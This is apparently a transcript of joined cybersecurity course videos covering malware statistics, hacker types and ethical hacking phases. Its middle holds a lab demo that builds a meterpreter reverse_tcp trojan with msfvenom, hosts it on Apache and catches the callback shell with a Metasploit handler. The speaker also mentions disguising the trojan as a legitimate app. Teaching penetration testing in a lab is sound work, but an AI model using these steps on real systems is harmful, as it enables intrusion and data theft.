way it is and if we want to keep
ourselves secure we are responsible for
it so please be very careful with those
passwords 24 000 malicious mobile apps
blocked daily in fact the latest example
that i can give give you i use an
android phone and there's an application
that i've always used called cam scanner
and recently just three days back my
mobile phone started telling me that it
is a malicious app right i've been using
it for years now probably three or four
years maybe more what is the software
you can click pictures of a document it
will automatically convert it it will
it will beautify it if that's a word
convert it into a pdf and i can then
send it as an attachment via email a
very handy app for me or was an handy
app for me it worked beautifully but
three days back suddenly
the android operating system and my
antivirus on my
android phone started reporting it as a
malicious software so i went online and
i checked into it and it seemed that
over a period of time the developers
changed their vision of that software
made it spyware and then there was a
dropper involved within that application
which would then download a malware from
a third-party server install it and
start spying on you and start showing
you malicious advertisements right so
this was an existing app which was
trusted over a period of years and over
a period of time slowly they modified it
into a spyware kaspersky was an
organization that detected it in the
first place and then pointed it out to
google google took it off the google
play market and now there is a variant
of it available but if you look at the
reviews all of them are one stars where
they have identified that this is the
malware now and it spies on them and it
actually compromised some people's data
so that's the latest example in 2017 or
18 there were 700 000 apps during that
year that were identified by google as
malicious apps and were deleted from
google play so even if they're published
there will be thousands of people who
download it till the time google
realizes that it is a malware and then
deletes it till then you've already been
compromised and there is no way to
protect yourself now so be very careful
when you download these applications in
the healthcare sector ransomware attacks
will quadruple now the healthcare sector
is a very volatile sector it contains a
lot of private and sensitive information
health information about individuals
that can be misused by a lot of
organizations advertisements
pharmaceutical organizations life
insurance people and whatnot right so
these became very lucrative targets for
hackers where if they can steal the
database and sell it on the black market
they will earn a lot of money
ransomwares would basically work the
other way around they encrypt the data
at the hospital side and then they will
hold the hospital ransom to pay up now
you know how hospitals earn nowadays
right so that's a lot of money that
you're looking at cyber crime would cost
up to six trillion dollars in 2021 six
trillion dollars just for cyber crime we
are not talking about the income from
the iit industry we are talking about
how much money we will lose to cyber
crime because of the various attacks
that we that would be created ninety
percent of hackers use encryption not
only encryption most of the advanced
hackers will try to hide their identity
by spoofing their ip addresses mac
addresses locations they will use
encryption and cryptography to hide
their malicious softwares to fool the
anti-viruses idss ips's and it would it
is a very difficult task to even
identify a particular malware analyze it
and then do a root cause analysis and
try to figure out who the responsible
hacker was so it's a very intensive task
of doing such things and most of the
hackers would go scot free because it is
very difficult to identify them now
let's move on to the demo it's a very
interesting demo you're using metasploit
which is a penetration testing tool and
if you're going to use a demo of using
metasploit we are going to try to
compromise the security of a particular
system well let's discuss the demo
before we start executing it so what we
have done here is that we have two
virtual machines on vmware workstation
one is the kali linux machine and the
other is a windows 7 machine what we are
going to do is we are going to use a
penetration testing tool called
metasploit which is available freely on
kali linux and we are going to use a
particular payload generator on
metasploit called msfv venom and using
msf venom we are going to create a back
door a executable file which will
contain a trojan or a backdoor and we
are going to try to infect that to the
windows machine and see what happens
when the victim executes that particular
file now we are going to keep it at the
basic level we're just going to create
the trojan and then we're going to
execute it in a later lecture or in a
later video we'll see how we can mask
that trojan into a legitimate looking
application so that a victim can be
fooled by the application that we're
going to execute so let's start with the
demo all right so this is the kali linux
vm and the other machine is a windows 7
virtual machine so what we are going to
do is on the kali linux machine we are
going to just open up a command prompt
right it's just regular command prompt
your regular commands and uh what we are
going to do is we are going to use the
msf venom payload generator from
metasploit to create a game.exe file now
the trojan is will be contained within
the game.exe so the command goes as such
msf venom hyphen p for platform we want
it or rather payload at this point in
time we want the payload to be windows
meetup reader reverse underscore tcp
lhost and ip address for the local host
i'll explain the command once i've typed
it let's just check what our ip address
for this machine is and we have 192 168
71.133
and that's what we're going to type in
here 192 168
71.133 l port 444 hyphen f
exe hyphen a x 86 and we want that
output in root desktop and we want it as
game.exe so let's go through the command
the msf venom is the initiator command
it invokes the payload generator in
metasploit hyphen p is the payload we
want windows meterpreter reverse tcp so
what is the reverse tcp here the meter
reader allows us for remote code
execution where we are going to create
the payload we are going to execute the
payload at the victims and and the
payload will then generate a connection
back to us
us bring the hackers machine and thus
the local host which is the ip address
of this machine which is the hackers
machine that we're using right now which
is 192.168.71.133
that's why we have typed in the
localhost and l port is a local port on
which port do we want to listen in or we
want the payload to connect to the
localhost so what we are doing is the
meterpreter allows us remote code
execution we create the game.exe we
execute it at the victim's end it is
pre-coded to connect to a local host the
ip address is coded over there to a
particular port which in this case is
444. you can put in any port number you
want just ensure that the port is going
to be free and it is not a regularly
used port otherwise you're going to get
problems over there so at this point in
time you're going to keep it as 444.
hyphen f stands for function we got an
executable file hyphen a stands for the
architecture here the architecture is
886 which is x86 which is 32 bit and we
are going to export it and we are going
to host it or we are going to create the
file on root desktop and we are logged
in as root as you can see at the prompt
so when i press enter i should see a
game.exe popping up right about here on
my desktop if the command is correct
which it should be and that's game.exe
wait for it to be compiled properly so
there you can see platform windows for
payload no encoder a payload size 33 333
bytes and final size of executable file
is 73 800
802 bytes so now we have created game
dot exe now we are not going to convert
this into or we are not going to merge
this into a malware and things like that
we are going to keep it simple so to
keep it simple what i'm going to do is
as a hacker i'm going to host this on a
server which is going to be on the same
machine right so when we say we want to
host an apache server the server is
hosted in a directory called slash var
bar slash www so let's go there present
working directory we can see that we are
in root cd where w and there we are cd
html and that is where our web servers
would be so what we are going to do is
we are going to create a directory mkdir
shared right to an ls and you can see
the shared folder right here ls hyphen
al will give you the list and the
attributes and we can see these
attributes we want to change these
attribute so we are going to use a chmod
recursive command give the permissions
as 755 to the folder
shared since we are in the same
directory we do not need to give the
path for shared let's just verify it and
you can see the permissions being
changed and now what we are going to do
is we are going to change the ownership
from root to www hyphen data for the web
hosting so ch own for change ownership
recursive www
to shared all right let's check if
that's been done properly and you can
see that earlier it was root root and
now it has dubbed up the hyphen data www
right and so that's the directory that's
that we have created let's go back uh
what we want to do is we want to copy
game.exe into this folder so
cp root desktop game.exe
dub html shared and cd shared let's see
we have game.exe right there there it is
and now what we want to do is service
apache to start so essentially what we
have done is we have created a directory
in the html folder to host this file and
we have copied it from our desktop into
the shared folder and i'm going to pause
here for a minute all right so we have
started the service for the apache 2
server that means we have started the
web server we have hosted the game.exe
on the web server in the shared folder
we have changed the permissions and the
ownership for the shared folder now we
are going to go on to the windows 7
machine
and we are going to open up the browser
and see if the web server is now
accessible so if you remember the ip
address of that machine was
192.168.71.133 and we were in the shared
folder 92 168 71.133
shared and if this is done properly we
should see the game.exe right here and
once we click on it it's going to
ask us whether we want to save the file
72.1 kb we're going to save it and i'm
going to save it on i think it just
saved it here and now before we execute
it we're going to go back into kali
linux and we are now going to start the
listener right so we have created the
exploit we've created the payload rather
we have hosted it onto a web server
which means that when somebody double
clicks on it the machine is going to try
to create a reverse connection to our
hacker's machine but our hacker's
machine needs to be configured to handle
that incoming connection so we are going
to start off with msf console now msf
console is the command which starts up
meta split right so we're just going to
take a minute over here uh you can see
it's metasploit framework control it's
going to start it's
does take a little bit of a while and
we're just going to wait it out let me
turn this into full screen i can see uh
at the bottom left we are on msf con on
the msf prompt we are using metasploit
with 1 699 exploits now this is not a
completely updated version the latest
one would have around 1800 exploits but
the one that we want is uh exists in
this version so there we are good to go
so we start off with the configuration
of metasploit to listen in on to that
particular connection so we say use
exploit multi handler and when you say
multi multi is basically something that
affects multiple operating system and
we're going to use that exploit and you
can see uh it's now opening up the
handler which we need to configure and
here we're going to set the payload that
it is going to expect the payload being
windows meter preter reverse underscore
tcp i can see that the payload has been
configured we are going to say show
options and you'll see it is going to
ask us options uh for the payload which
means the localhost the listen address
and the listing port now you can see we
had by default given 444 which is the
default port for this exploit within
metasploit if you want to change if you
have changed the port when you created
game.exe you need to change the port
over here as well and the commands here
that says set lhost
equals 192.168.71.133
enter and i think i did a typo so uh
there's no equal to that's it and you
can see now it shows the equal to mark
and we have now set the local host if we
want to set the l port that's how we do
it we had 444 and there it is so if you
have changed the port in the game.exe
ensure that you change the port here as
well show options and you'll see now the
data is populated over here lhost which
is the local host is 192.168.71.133
and l port the local port is 444. we
have configured this and now what we're
going to do is we're just going to type
in exploit and now you can see that it
has started the reverse tcp handler on
192 168 71.133
on port 444 so now when the victim which
is windows 7 executes the file and we
say run at the victim's end there's
nothing that should happen uh it's just
uh resolving something and at the other
end you can see that a meet operator
station has been opened and it shows us
that from the victim's ip which is
71.129
on port 49493 we are connected to our
machine so that's that's the connection
that has happened press enter and you
can see it exists exits the session
let's just look at the ip address on
windows to confirm that was the same
machine that we had and that's 129 right
there it is
let's
open up this file again and see what
happens and you can see the second
session being opened up right here to a
pwd and you can see that we were
connected to that particular website
right so that's what uh this trojans are
supposed to give us a backdoor entry and
we then uh are able to connect and we
are able to copy data and we are able to
basically we have a back door so we can
do anything and everything that we want
to do
we humans are highly tech savvy in
today's times
with the extensive use of the internet
and modern technologies there is a
massive challenge in protecting all our
digital data such as net banking
information account credentials and
medical reports to name a few have you
heard about the deadly wannacry
ransomware attack
the attack happened in may 2017 in asia
and then it spread across the world
within a day more than 230 000 computers
were infected across 150 countries
the wannacry cryptoworm encrypted the
data and locked the users out of their
systems
for decryption of the data the users
were asked for a ransom of 300 to 600
dollars in bitcoin
the users who use the unsupported
version of microsoft windows and those
who hadn't installed the security update
of april 2017 were targeted in this
attack
the wannacry attack took a toll on every
sector top tier organizations like
hitachi nissan and fedex had to put
their businesses on hold as their
systems were affected too
now this is what you call a cyber attack
to prevent such attacks cyber security
is implemented we can define cyber
security as the practice of protecting
networks programs computer systems and
their components from unauthorized
digital attacks these illegal attacks
are often referred to as hacking hacking
refers to exploiting weaknesses in a
computer network to obtain unauthorized
access to information a hacker is a
person who tries to hack into computer
systems
this is a misconception that hacking is
always wrong there are hackers who work
with different motives
let's have a look at three different
types of hackers
black hat hackers are individuals who
illegally hack into a system for a
monetary game on the contrary we have
white hat hackers who exploit the
vulnerabilities in a system by hacking
into it with permission in order to
defend the organization this form of
hacking is absolutely legal and ethical
hence they are also often referred to as
ethical hackers
in addition to these hackers we also
have the grey hat hackers as the name
suggests the color gray is a blend of
both white and black
these hackers discover vulnerabilities
in a system and report it to the
system's owner which is a good act
but they do this without seeking the
owner's approval
sometimes grey hat hackers also ask for
money in return for the spotted
vulnerabilities
now that you have seen the different
types of hackers let's understand more
about the hacking that is legal and
valid ethical hacking through an
interesting story dan runs a trading
company he does online training with the
money his customers invest everything
was going well and dan's business was
booming
until a hacker decided to hack the
company's servers
the hacker stole the credentials of
various trading accounts he asked for a
lump sum ransom in exchange for the
stolen credentials dan took the hacker's
words lightly and didn't pay the hacker
as a result the hacker withdrew money
from various customers accounts and dan
was liable to pay back the customers
dan lost a lot of money and also the
trust of his customers
after this incident dan gave a lot of
thought as to what could have gone wrong
with the security infrastructure in his
company
he wished there was someone from his
company who could have run a test attack
to see how vulnerable systems were
before the hacker penetrated into the
network this was when he realized he
needed an employee who thinks like a
hacker and identifies the
vulnerabilities in his network before an
outsider does
to do this job he hired an ethical
hacker john
john was a skilled professional who
worked precisely like a hacker in no
time he spotted several vulnerabilities
in dan's organization and closed all the
loopholes
hiring an ethical hacker helped dan
protect his customers from further
attacks in the future
this in turn increased the company's
productivity and guarded the company's
reputation
so now you know hacking is not always
bad
john in this scenario expose the
vulnerabilities in the existing network
and such hacking is known as ethical
hacking ethical hacking is distributed
into six different phases
let us look at these phases step by step
with respect to how john our ethical
hacker will act before launching an
attack the first step john takes is to
gather all the necessary information
about the organization's system that he
intends to attack this step is called
reconnaissance he uses tools like nmap
and h-ping for this purpose john then
tries to spot the vulnerabilities if any
in the target system using tools like
nmap and expose
this is the scanning phase
now that he has located the
vulnerabilities he then tries to exploit
them
this step is known as gaining access
after john makes his way through the
organization's networks he tries to
maintain his access for future attacks
by installing back doors in the target
system
the metasploit tool helps him with this
this phase is called maintaining access
john is a brilliant hacker hence he
tries his best not to leave any evidence
of his attack
this is the fifth phase clearing tracks
we now have the last phase that is
reported
in this phase john documents a summary
of his entire attack the vulnerabilities
he spotted
the tools he used and the success rate
of the attack
looking into the report dan is now able
to take a call and see how to protect
his organization from any external cyber
attacks
don't you all think john is an asset to
any organization if you want to become
an ethical hacker like john
then there are a few skills that you
need to acquire
first and foremost you need to have a
good knowledge of operating environments
such as windows linux unix and macintosh
you must have reasonably good knowledge
of programming languages such as html
php python sql and javascript
networking is the base of ethical
hacking hence you should be good at it
ethical hackers should be well aware of
security laws so that they don't misuse
their skills
finally you must have a global
certification on ethical hacking to
successfully bag a position of an
ethical hacker like john
few examples of ethical hacking
certification are certified ethical
hacker certification ceh comptia pentest
plus
and licensed penetration tester
certification to name a few
simplylearn provides a cybersecurity
expert masters program that will equip
you with all the skills required by a
cyber security expert you could have a
look at it by clicking the link in the
description the endless growth of
technologies in this area is directly
proportional to the number of cyber
crimes
cyber crimes are estimated to cost 6
trillion dollars in 2021
hence to tackle these cyber crimes
organizations are continuously on the
lookout for cyber security professionals
the average annual salary of a certified
ethical hacker is ninety-one thousand
dollars in the u.s and approximately
rupees seven lakhs in india
so what are you waiting for get
certified and become an ethical hacker
like john and put an end to the cyber
attacks in the world
when we hear the term hacker we may
picture a dangerous cyber criminal
however not all hackers are inherently
bad they are powerful individuals who
use their technical skills to break into
computer networks and bypass security
measures
hacking is not always bad and it is to
be noted that the world of computers is
actually safer to an extent because of a
particular type of hacker
a hacker is deemed to be good or bad
depending on their motive and whether or
not they are breaking the law
hackers are basically categorized by the
type of metaphorical hat they tone
white hat grey hat and black hat
hackers can either be a black hat or a
white hat or a gray hat
hackers can be good or bad depending on
which color hat they decide to wear and
by this we mean their hacking motifs and
obviously not in the sense of creating a
fashion statement here
let's have a look at our story
our story here revolves around dan who
is the owner of a company that provides
a platform for video conferencing
his platform enables online
communication for video meetings audio
meetings and webinars
just like other video conferencing
platforms his platform too has built-in
features like chat recording screen
sharing and so on
everything went well and his business
increased tremendously with the onset of
the covet 19 pandemic
coed 19 accelerated the rise of the
worldwide digital economy and it made
people rapidly adopt video conferencing
tools and apps
in a contactless world starting from
employee interactions to family
get-togethers to virtual workout classes
everything happened virtually dance
media conferencing platform enabled
long-distance communication and enhanced
collaboration
so now you might be wondering what could
have gone wrong well there are many
risks involved when it comes to the
safety of these online platforms
online meeting rooms are susceptible to
a number of digital threats
dan received complaints from his
customers that his platform was insecure
and safe anymore
little did dan know that the popularity
of his video conferencing platform made
hackers eager to disrupt the virtual
meetings and hijack the conferences
his platform witnessed complaints like
the addition of an unknown participant
in every meeting room someone covering
up information that is being presented
and also unknown screen recording of a
meeting to name a few
these intruders were sneaky hackers who
tried to gain access to sensitive
information and who tried to disrupt
meetings
and how did these hackers manage to do
all this
well this was done by exploiting
weaknesses in dan's computer network in
order to obtain unauthorized access to
crucial data and sensitive information
this is known as hacking and the
individuals who carry this out are known
as hackers
in this form of hacking that dan
witnessed hackers exploited dance
company's security posture by
identifying weaknesses in it in order to
intrude into the meetings and gain
access to business data or personal data
and this form of hacking is definitely
bad and unethical the hackers who
carried this against dance company are
known as black hat hackers
these hackers are cyber criminals who
carry out cyber attacks with a negative
intention
these attacks can be in the form of
trojan virus malware attacks phishing
attacks ddos attacks man in the middle
attacks sequel injection attacks and so
on
so who exactly is a black hat hacker
like in the case of dance organizations
cyber attack
black hat hackers are highly skilled
cyber criminals who break into computer
systems and networks with malicious
intent
they illegally hack into a system and
this is obviously without the system
owner's approval
such hackers do not abide by the loss
they violate laws and disrupt networks
the motive behind these attacks vary
from monetary gains to personal profit
usually they are for monetary gains
black hat hackers may violate the
confidentiality integrity or
availability of a company systems and
data they may also use malware to
destroy files or steal passwords credit
card numbers and other confidential
information
black hat hackers are also sometimes
called crackers
so this is who a black hat hacker is
moving back to dan's story
black hat hackers disrupted his business
and he lost his customers as nobody
wished to communicate on an unsecure
platform
it is but true right would you be okay
to use a platform that is unsafe
none of us want to have unknown people
in our meetings right this is how dan's
customers felt too and this news spread
and his company's reputation took a bad
hit
that is when ted approached dan so who
is dead let's have a look at that now
ted who was unknown to dan explained to
him that he found dan's network to be
weak
ted told dan that he has identified
vulnerabilities in dance systems and
networks and he will fix them provided
dan pays him well
dan had nothing to lose and without any
further delay he paid ted a good amount
of money to fix the vulnerabilities in
dance networks
on receiving the money ted began his
work and he fixed all the issues and
vulnerabilities in dan's network he made
sure that nobody can exploit dan's
network vulnerabilities again and this
way he safeguarded dance network for the
time being
so who is dead well he's called a gray
hat hacker as they say not all things
are black and white so is the concept of
grey hat hackers as fascinating as the
name sounds let us dive deep into
understanding the role of a gray hat
hacker a grey hat is a security expert
who may at times violate the laws or the
ethical standards
however they do not carry a malicious
intent unlike a black hat hacker
hence they are known to work both
defensively and offensively
they land between the good and the bad
greyhound hackers look for
vulnerabilities in a system without
permission but with good intentions
just like how ted informed dan about how
he could exploit dan's system
vulnerabilities grey hat hackers inform
an organization the same and in return
ask for a fee to fix it
in some cases when the organization
doesn't comply grey hat hackers may
become black hat hackers
although a grey hat hacker's intention
might not be bad what they do is still
illegal since they do not have
permission to break into another system
back to our story
although dance issue was sorted by ted
for the time being he had a few concerns
his first concern was history repeating
itself yes he was worried about what if
black hat hackers hack into his systems
again
although his system vulnerabilities are
fixed at the moment it was a matter of
time before they could be exploited
again with new hacking techniques
his next thought was to have a
professional who could constantly keep a
tab on his networks and protect it from
hackers don't you think his concerns
were justified yes it was as this was
the only way he could provide a safe and
secure video conferencing platform in
the long run
that is when dan's friend came to his
rescue and introduced anne the ethical
hacker to him
and being an ethical hacker assured dan
that she would scan and identify his
network for system vulnerabilities
before an outsider exploits it and she
would fix those vulnerabilities on a
regular basis
such ethical hackers like anne are
called white hat hackers
now that we saw who black hat hackers
and grey hat hackers were it is time we
learn about our third type of hacker who
is a white hat hacker
a white hat hacker gains access to
networks with an intention to fix the
identified weaknesses
they also perform penetration testing
and vulnerability assessments and break
into systems with permission
they search for loopholes or
vulnerabilities in any given piece of
technology just like how a black hat
hacker would do however white hat
hackers harden their organization system
before the bad guy can get in
their goal is to spot system and network
vulnerabilities in order to improve
system security
white hat hackers are also known as
ethical hackers since they obey the law
of the land and follow a code of ethics
many companies and government
organizations employ white hat hackers
to help them secure their systems
these hackers are typically hired by
organizations to look for
vulnerabilities in a system like other
hackers
the only difference being they are given
permission to break in
once dan spots the vulnerabilities she
documents her findings and gives dan
advice on how to fix them or she'll even
take it up to fix them so that an
outsider cannot spot it in the future
anne does this on a regular basis as
system updates happen regularly and it
is imperative to be on track with it and
fix new vulnerabilities
this made sure dan's network is now safe
and secure
gradually he regained his customers
trust and his platform got back to being
one of the best and safest platforms for
video conferencing
this resulted in a huge business growth
and dan was very happy
just like how ann put an end to dance
business problems there are many white
hat hackers out there who are in great
demand by organizations to safeguard
their networks from cyber attacks
and if you are interested in a career in
ethical hacking then simply learn can
help you fulfill your dreams
simply learn ch version 11 certification
provides you the hands-on training
required to master the techniques
hackers use to penetrate network systems
and fortify your system against it
this ethical hacking course is aligned
with the latest ch version 11 by ec
council and will adequately prepare you
to increase your blue team skills
so what are you waiting for get
certified with simply learn and become a
certified ethical hacker and put an end
to the cyber crimes in the world
remember the more active white hat
hackers are the fewer opportunities
black hat hackers have for system
exploitation
so let's talk about hacking and what
exactly hacking is hacking refers to
exploiting weaknesses in a computer
network to obtain unauthorized access to
information a hacker is a person who
tries to hack into computer systems now
here there are some keywords that we
need to understand first and foremost
exploit when you are exploiting
weaknesses weaknesses are technically
called vulnerabilities which are
basically design flaws misconfiguration
errors usage of default usernames and
passwords which have not been modified
so any misconfiguration or anything that
has been left behind by a security
administrator that can be misused which
means exploited by a hacker to gain
unauthorized access so the next term is
unauthorized access something that
you're not allowed to do and when you
say a hacker is a person who tries to
hack it's basically a person with
malicious intent trying to gain access
to a system or a resource that they are
not authorized to access in the first
place how do they do it they find a
vulnerability that is a weakness or a
flaw and then they misuse it to gain
access to that particular network so
here in the diagram you can see that a
sender on the left-hand side is trying
to send some data to the receiver on the
right hand side the hacker would try to
gain unauthorized access to the
transmission that is being sent and
would try to capture the data packets
and read the secrets within let's look
at a business case scenario into hacking
now there is an organization everybody
is going around their own business when
they realize that their systems may have
been compromised now they're trying to
look at the customer data to ensure that
that has not been compromised and trying
to assure the customers however they do
realize that some customer data has been
lost and even the company reports have
been modified as well now this is the
scenario where there have been some
security controls in place and those
controls have been identified they
realized that there is an attack that
has happened and based on that attack
they have realized that the data has now
been compromised and the records have
been modified uh by the hacker which
means that the data is no longer
trustworthy and thus cannot be used by
the business for any legal transactions
so then the hacker gives a call to the
organization or gets connected to the
organization demanding a ransom for the
data to be replaced to be taken back
into the original state where it was
trusted and thus the organization can
utilize it for business transactions the
organization has probably no backup so
they decide that they want to pay the
lump sum to the hacker to restore that
data so that they can continue on with
the business does money exchanges and
the hacker is able to restore that data
and the business continues that as usual
however the activity here of a hacker
trying to leverage the misconfiguration
of the weaknesses in the organization's
security thus being able to hack them
and make these ransomware demands so the
company then wants to figure out even if
having a security system in place how
was the hacker able to hack their
systems thus one of the employees comes
up with a brilliant idea of identifying
vulnerabilities in the network to
proactively search for any flaws that
have been left behind
so that they can plug those flaws and
nobody can misuse them
thus they figure out that they want to
hire an ethical hacker who would help
them identify the security portion of
the organization identify the weaknesses
vulnerabilities and flaws and help them
remedy those laws so that in future
scenarios these scenarios will not
happen so before we go into an ethical
hacker let's understand what are the
types of hackers so what are the types
of hackers hacker is a technically
skilled person who is very adept with
computers they have good programming
skills they understand how operating
system works they understand how
networks work they understand how to
identify flaws and vulnerabilities
within all of these aspects and then
they understand and know how to misuse
these flaws to get a outcome which would
be detrimental to the health of the
organization
so there's six type of hackers that have
been identified black hat hackers white
hat hackers grey hat script kiddies
nation's players sponsored hackers and a
hacktivist so black hat hackers are
basic basically the malicious hackers
who have malicious intent and have
criminalistic tendencies they want to
harm the organization by hacking into
their infrastructure by destroying their
infrastructure by destroying the data so
that they can gain from it from a
monetary perspective these guys are also
known as crackers the main aspect of
these people are that they have
malicious intent they try to do
unauthorized activities and they try it
for personal gain another important
aspect to remember is that a black hat
hacker will always try to hide their
identity they'll spoof their online
digital identity by masking it by
spoofing their ipaddresses mac addresses
and try to remain anonymous on the
network a wide attacker on the other
hand is also an ethical hacker or a
security analyst who's an individual who
will do exactly the same thing that a
black hat hacker would do minus the
malicious intent plus the intent of
helping the organization identifying the
flaws and remedying them so that nobody
else can misuse those vulnerabilities so
they are authorized to act on the
company's behalf they are authorized to
do that activity which would help the
company identify those flaws and thus
help the company mitigate those flaws
improving on their security portion so
these uh these kind of security experts
or ethical hackers would help
organizations defend themselves against
unauthorized attacks greyhead hackers is
a blend of both white hat and black hat
hackers so here they can work
defensively and offensively both they
can accept contracts from organizations
to increase their security posture at
the same time they can also get
themselves involved in malicious
activities towards other organizations
to personally gain or benefit from them
by doing unauthorized activity script
kitties are people uh who are
technically not much aware about what
hacking is
they rely on existing tools that have
been created by other hackers they have
no technical knowledge of what they're
doing it's just a hit or miss for them
so they just get their hands on a tool
they try to execute those tools uh if
the hack works it works otherwise it
doesn't so these people are basically
who are noobs or newbies who are trying
to learn hacking or uh just uh people
who with malicious intent who just want
to have some fun or trying to impress
people around then we have the nation or
the state-sponsored hackers as the name
suggests these hackers are sponsored by
their government now this may not be a
legitimate job but most of the
governments do have hackers enrolled in
their pay on uh on their
organizations to spy on their enemies to
spy on various countries and try to
figure out uh the aspirations of those
countries so this is basically a spying
activity where you are technically
trying to get access to other countries
resources and then try to spy on them to
figure out what their activities have
been or what their future plans have
been and then we have the hacktivist who
is an individual who has a political
agenda to promote and they promoted by
doing hacking so these guys what is the
difference between a black hat hacker
and a hacktivist the black hat hacker
may try to hide their identity a
hacktivist will claim responsibility of
what they have done so for them it's a
political agenda political cause and
they will try to hack various
organizations to promote their cause
they would probably do this by defacing
the website and posting the messages
that they want to promote on these
websites so what exactly is ethical
hacking then we have discussed the types
of hackers we have identified a
malicious hacker as a black hat hacker
with the intent
of doing harm to an organization's
network for personal gain we have
discussed what the ethical hacker is so
an ethical hacker would be doing the
same activity but in an authorized
manner so they would have legal
contracts that they would be signing
with the organization it would give them
a definite scope of what they're allowed
to do and what they are not allowed to
do and the ethical hackers would
function within those scopes would try
to execute those test scenarios where
they would be able to identify those
flaws or those system vulnerabilities
and then they would be submitting a
report to the management of what they
have found they would also help the
management to mitigate or to resolve
those weaknesses so that nobody else can
misuse them later on they might use the
same techniques and the same tools that
black hat hackers do however the main
difference here is that these guys are
authorized to do that particular
activity they're doing it in a
controlled manner with the intent of
helping the organization and not with
the intent of personal gains so who's an
ethical hacker again an ethical hacker
is a highly intelligent highly educated
person who knows how computers function
how programming languages work how
operating systems work they can
troubleshoot they're technically very
adept at computing they understand the
architecture they understand
how various components in a computer
work they can troubleshoot those
components and they can basically be
very good with programming as well now
when i say programming we don't want the
ethical hacker to be a good developer of
applications we want them to understand
programming in such a way that they can
create scripts they can write their own
short programs like viruses worms
trojans or exploits which would help
them achieve the objective that they
have set out for so uh here you can see
the ethical hacker they're individuals
who perform a security assessment of the
companies with the permission of
concerned authorities so what is a
security assessment a security
assessment is finding out the exact
security posture of the organization by
identifying what security controls are
in place how they have been configured
and if there are any gaps in the
configurations themselves so an
organization will hire a heckler hacker
they they would give the ethical hacker
the information about what information
is or what security controls what
firewalls now what idss ipss introducing
detection or intuition prevention
systems antiviruses are already in place
and then they will ask the ethical
hacker to figure out a way to bypass
these mechanisms and see if they can
still hack the organization what is the
need of an ethical hacker the need of an
ethical hacker is proactive security the
ethical hacker would identify all the
existing flaws in an organization and
try to resolve those laws to help secure
the organization from black hat hackers
so ethical hackers would prevent hackers
from cracking into an organization's
network by securing the organization by
improving on their security on a
periodic basis and they would also try
to identify system vulnerabilities
network vulnerabilities or application
level vulnerabilities that would have
been missed or have already been missed
and then tried to figure out a way of
plugging them or
resolving them so that they cannot be
misused by other hackers they would also
analyze and enhance an organization
security policies now what are policies
policies are basically documents that
have been created by an organization of
rules that all the employees need to
follow to ensure that the security of an
organization is maintained for example a
password policy a password policy would
help users in an organization to adhere
to the standards the organization has
identified for a password complexity for
example a password when a user is
creating them should adhere to standards
where they are using random words they
are they contain the alphabet a through
z uppercase and lowercase 0 through 9 as
numerics and special characters and they
are randomized so that the password
becomes much more stronger to prevent
from brute force attacks so what would
an ethical hacker do at this point in
time they would try to test the strength
of the passwords to see if brute force
attacks or dictionary attacks are
possible and if any of these passwords
can be cracked they will ensure that all
the employees are following the policies
and all the passwords are as secured as
the policies want them to be if there
are any gaps in the policies or the
implementation of the policy it is the
ethical hacker's responsibility to
identify those gaps and warn the
organization about it similarly they
would also try to protect any personal
information any data that is owned by
the organization that is critical for
the functioning of the organization and
they will try to protect it by from
falling into the hacker's hands now what
are the skills that are required of an
ethical hacker these are the following
skills so first and foremost they should
have good knowledge with operating
systems such as windows linux unix and
mac now when we say knowledge about
operating systems it's not only about
how to use those operating systems but
how to troubleshoot those operating
systems how these operating systems work
how these operating systems need to be
configured how can they be secured for
example securing an operating system is
not only installing a firewall and an
antivirus but you need to configure
permissions on an operating system of
what users are allowed to do and what
users are not allowed to do for example
limiting the installation of
applications how are we going to do that
we need to go into the system center the
security center of windows and we need
to configure security parameters over
there of what are acceptable softwares
and what are not same with linux and mac
software's operating systems so we need
to know how we can secure these
operating systems similarly all of these
would have desktop versions and server
versions of operating systems as a
ethical hacker we need to know the
desktop and server versions both how to
configure them and how to provide
services within the organization on
these servers so that they can be
consumed in a secure manner by all the
employees at the same time they should
also be knowledgeable of programming
languages or scripting languages such as
php python ruby html for programming if
you will because web servers come into
the picture so again they should not be
great developers where they can create
huge applications but they should be
able to develop scripts understand those
scripts analyze those scripts and figure
out what the output should be of those
scripts to achieve the hacking goals
that they have set out for an ethical
hacker should have a very good
understanding about networking no matter
whether you're in application security
you're in network security or you're in
host-based security since a computer
will always be connected to a network
either a local area network like a lan
or the internet we should know how
networking works we should know the
seven layers of the osi model we should
know which protocols work on those seven
layers we should identify the tcp model
and how osi model can be mapped to the
tcp model we should understand how tcp
and udp work how how each and every
protocol is crafted how they are
supposed to behave for us to analyze and
understand any network based attacks we
should be very good in security measures
so we should know where those
vulnerabilities would lie what are the
latest exploits available in the market
and we should be able to identify them
we should be able to know the techniques
and the tools of how to deal with
security how to analyze security and
then how to implement security to
enhance it as well along with that it is
important that a security analyst or
ethical hacker is aware of the local
security laws and standards why is that
because an organization cannot do any
illegal activity whatever responses that
they have whatever security mechanisms
whatever security controls they will
implement they need to be adhering to
the local law of the land they should be
legal in nature and should not cause
undue harm to any of the employees or
any of the third party clients that they
are dealing with so the ethical hackers
should be aware of what security laws
are before they implement security
controls or even before they start
testing for security controls and all of
these should be backed up by having a
global certification or a globally valid
certification related to networking
related to security ethical hacking the
law of the land anything and everything
maybe even programming it's good to have
a certification in php perl python ruby
and so on so forth why because most of
the organizations when they hire ethical
hackers look out for these
certifications especially globally valid
certifications so that they can be sure
or they can be assured that the person
that they are hiring has the required
skill set so let's talk about a few of
the tools that a ethical hacker would
utilize in the testing scenarios to be
honest there are hundreds of tools out
there what you see on the screen is just
a few examples of them
nessus is a vulnerability scanner what
is a vulnerability scanner it is an
automated tool that is designed to
identify vulnerabilities within hosts
within
operating systems within networks so
they come with their ready-made
databases of all the vulnerabilities
that have already been identified and
the scan the network against that
database to find out any possible flaws
or any possible vulnerabilities that
currently exist on the host or the
operating system or on the network
similarly there would be application
scanners like uh acunetix or arachne
that would help you scan applications
and identify flaws within those
applications as well now all of these
are automated tools the essence of
ethical hacker is when these tools churn
out the reports the ethical hacker can
understand these reports analyze them
identify the flaws and then craft their
own exploits or use existing exploits in
a particular manner so that they can
get access or they can bypass the access
or security controls mechanisms that are
already in place how can they do that
with the tool called metasploit you see
that big m there on the right hand side
that m logo is for a tool called
metasploit which is a penetration
testing tool what is a penetration
testing tool it is that tool that will
allow a ethical hacker to craft their
exploits or choose their exploits for
the vulnerabilities that have been
identified by nessus since we are
interacting with computers we will
always be interacting using tools right
so the first tool nessus identifies the
flaws and the possible list of
vulnerabilities we do a penetration test
using metasploit to validate those flaws
